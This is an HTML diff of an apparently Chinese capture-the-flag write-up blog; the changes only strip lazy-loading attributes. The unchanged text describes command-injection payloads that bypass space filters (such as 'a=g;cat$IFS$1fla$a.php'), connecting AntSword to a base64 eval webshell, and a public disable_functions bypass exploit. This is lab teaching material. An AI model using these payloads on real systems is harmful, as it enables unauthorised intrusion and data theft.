@@ -50,18 +50,18 @@
 <a id="more"></a>
 
 <p>先来看看题目的界面</p>
-<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-96.png" alt="" loading="lazy"></p>
+<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-96.png" alt=""></p>
 <p>由题意得，传参ip</p>
-<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-97.png" alt="" loading="lazy"></p>
+<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-97.png" alt=""></p>
 <p>联想命令执行，命令执行的方法大致两种：</p>
 <pre class=" language-shell"><code class="language-shell">;：用于连续指令执行
 |：管道符，将左边的输出当做右边的输入，只返回右边的结果</code></pre>
 <p>尝试分号：</p>
-<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-98.png" alt="" loading="lazy"></p>
+<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-98.png" alt=""></p>
 <p>发现目录下包含两个文件：index.php 和 flag.php</p>
 <p>尝试cat查看：</p>
-<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-99.png" alt="" loading="lazy"></p>
-<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-100.png" alt="" loading="lazy"></p>
+<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-99.png" alt=""></p>
+<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-100.png" alt=""></p>
 <p>emmmmmmmmmmmmm空格被办了。。。</p>
 <p>从大佬那学习绕过空格的方法，大概有以下几种：</p>
 <pre class=" language-shell"><code class="language-shell">$IFS
@@ -73,8 +73,8 @@ $IFS$1 //$1改成$加其他数字貌似都行
 %20 
 %09 </code></pre>
 <p>各种尝试后发现$IFS$1有效，分别查看两个文件，如图：</p>
-<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-101.png" alt="" loading="lazy"></p>
-<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-102.png" alt="" loading="lazy"></p>
+<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-101.png" alt=""></p>
+<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-102.png" alt=""></p>
 <p>index.php代码如下：</p>
 <pre class=" language-php"><code class="language-php"><span class="token operator">/</span><span class="token operator">?</span>ip<span class="token operator">=</span>
 <span class="token operator">/</span><span class="token operator">?</span>ip<span class="token operator">=</span>
@@ -104,13 +104,13 @@ cat fl''ag.php 不行</code></pre>
 <p>顾名思义，变量拼接就是：a=f;b=lag.php;cat $a$b</p>
 <p>利用到解题中：</p>
 <pre class=" language-shell"><code class="language-shell">a=g;cat$IFS$1fla$a.php</code></pre>
-<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-103.png" alt="" loading="lazy"></p>
+<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-103.png" alt=""></p>
 <p>[・_・?]</p>
 <p>F12即可得出答案：</p>
-<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-104.png" alt="" loading="lazy"></p>
+<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-104.png" alt=""></p>
 <p>参考大佬原文：<a href="https://www.jianshu.com/p/fd7f9fcc9333" target="_blank" rel="noopener">ping</a></p>
 <h3 id="BJDCTF-2nd—duangShell"><a href="#BJDCTF-2nd—duangShell" class="headerlink" title="BJDCTF-2nd—duangShell"></a>BJDCTF-2nd—duangShell</h3><p>首先首页提示</p>
-<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20200327192750978.png" alt="" loading="lazy"></p>
+<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20200327192750978.png" alt=""></p>
 <p>.swp源码泄露，是使用vim编辑器的缓存文件</p>
 <p>于是访问<code>url/.index.php.swp</code>下载该文件，然后用<code>vim -r index.php.swp</code>恢复文件，得到源码</p>
 <pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token doctype">&lt;!DOCTYPE html></span></span>
@@ -208,14 +208,14 @@ cat fl''ag.php 不行</code></pre>
 <span class="token keyword">new</span> <span class="token class-name">ClassName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
 <p>可以看到已经相当于有一个马在上面了， <code>@Eval(base64_decode($_REQUEST[&#39;Ginkgo&#39;]));</code></p>
 <p>于是直接用蚁剑连接：</p>
-<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20200525111558751.png" alt="" loading="lazy"></p>
+<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20200525111558751.png" alt=""></p>
 <p>注意这里自带的base64解码好像用不了，在网上找一个可以用的，<a href="https://github.com/AntSwordProject/AwesomeEncoder/blob/master/php/encoder/b64pass.js" target="_blank" rel="noopener">链接</a></p>
-<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20200525111835994.png" alt="" loading="lazy"></p>
+<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20200525111835994.png" alt=""></p>
 <p>添加到<code>AntSword</code>即可连接成功</p>
 <p>虽然连上去了，也可以看到根目录下的flag，但是并没有权限直接读取flag，但是我们可以看到有一个readflag可执行文件，应该就是想办法利用这个文件来读取flag了</p>
-<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20200525113128509.png" alt="" loading="lazy"></p>
+<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20200525113128509.png" alt=""></p>
 <p>然而我们并不能直接执行这个readflag文件，因为<strong>phpinfo</strong>中的<strong>disable_functions</strong>选项禁用了很多命令执行函数：</p>
-<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20200525113418596.png" alt="" loading="lazy"></p>
+<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20200525113418596.png" alt=""></p>
 <p>于是有要想办法bypass  disable_functions来执行命令了，在网站找到可以直接执行命令的exp：</p>
 <p><a href="https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php" target="_blank" rel="noopener">https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php</a></p>
 <p>直接传到网站的tmp目录下，我们具有tmp目录所有权限，令exp中<code>pwn(&quot;/readflag&quot;);</code>再发包<code>include(&#39;/tmp/exploits.php&#39;);</code>经过base64编码后的数据，即可读到flag</p>
